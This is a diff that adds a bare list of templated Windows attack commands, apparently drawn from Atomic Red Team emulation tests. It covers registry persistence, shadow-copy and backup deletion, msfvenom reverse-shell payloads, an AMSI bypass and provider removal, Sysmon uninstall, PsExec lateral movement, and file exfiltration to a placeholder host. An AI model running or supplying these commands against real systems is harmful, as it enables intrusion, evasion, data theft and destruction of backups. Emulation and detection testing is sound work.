@@ -1,0 +1,39 @@
+red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+powershell -c "sync -avz ${source_file_path} ${destination_file_path}"
+powershell -c "Copy-Item ${source_directory} -Destination ${destination_directory} -Recurse"
+cmd.exe /c "vssadmin.exe delete shadows /all /quiet"
+powershell -c "wbadmin delete systemstatebackup -keepVersions:0"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+powershell -c "scp ${username}@${ip_address}:${destination_file_path} ${source_file_path}"
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
+sysmon -u
+nltest /domain_trusts
+cmd.exe /c "wbadmin delete systemstatebackup -keepVersions:0"
+powershell -c "choco install putty"
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v ${value_name} /t REG_DWORD /d ${value}
+putty -ssh ${username}@${ip_address} -pw ${password}
+powershell -c "xcopy ${source_file_path} \\${ip_address}\${destination_file_path}"
+powershell -c "wmic shadowcopy call create Volume=C:"
+red add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /V "Atomic Red Team" /t REG_SZ /f /d "${command_to_execute}"
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+putty -ssh ${username}@${ip_address} -pw ${password} -m script.txt
+PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}
+cmd.exe /c "wmic shadowcopy call create Volume=C:"
+cmd.exe /c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+certreq.exe -Post -config ${destination_file_path} c:\windows\win.ini ${source_file_path}
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ${value_name} /t REG_DWORD /d ${value}
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v "Atomic Red Team" /t REG_MULTI_SZ /d "${command_to_execute}" /f
+putty -ssh ${ip_address} -l ${username} -pw ${password}
+powershell -c "PsExec64 \\${ip_address} -i -u ${username} -p ${password} ${command_to_execute}"
+sftp ${username}@${ip_address}:${destination_file_path} <<< $"put ${source_file_path}"
+cmd.exe /c "copy ${source_file_path} ${destination_file_path}"
+whoami /all
+Invoke-RestMethod -Uri ${ip_address}:${port} -Method Post -InFile ${source_file_path} -ContentType "multipart/form-data"
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+msfvenom -p windows/meterpreter/reverse_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+powershell -c "wmic /node:"${ip_address}" shadowcopy call create Volume=C:"
+putty -ssh ${ip_address} -l ${username} -pw ${password} -m script.txt
+nltest /dclist
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+Copy-Item ${source_file_path} -Destination ${destination_file_path} -Recurse -Container
+cmd.exe /c "wmic.exe shadowcopy delete"
